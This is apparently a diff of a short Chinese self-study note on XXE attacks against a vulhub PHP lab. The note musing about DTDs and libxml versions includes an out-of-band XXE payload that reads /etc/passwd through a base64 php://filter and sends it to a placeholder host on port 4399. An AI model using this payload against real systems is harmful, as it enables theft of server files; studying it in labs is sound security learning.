@@ -4,10 +4,9 @@ dtd文档是什么?
   这几天一直在学习xxe，突然..我不知道发生了 什么..
 
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+<!DOCTYPE foo [ <!ENTITY % file SYSTEM  "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://xxxxxxxxxxx:4399/?f=%file;'>">%eval; ]>
 
-<!ENTITY % file SYSTEM  "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://xxxxxxxxxxx:4399/?f=%file;'>">
-%eval;
 php 靶场vulhub
 #为啥是php伪协议,, simple——loadxxe，domxxe,  xmllib<1.6禁用外部实体..
 为啥java一番风顺
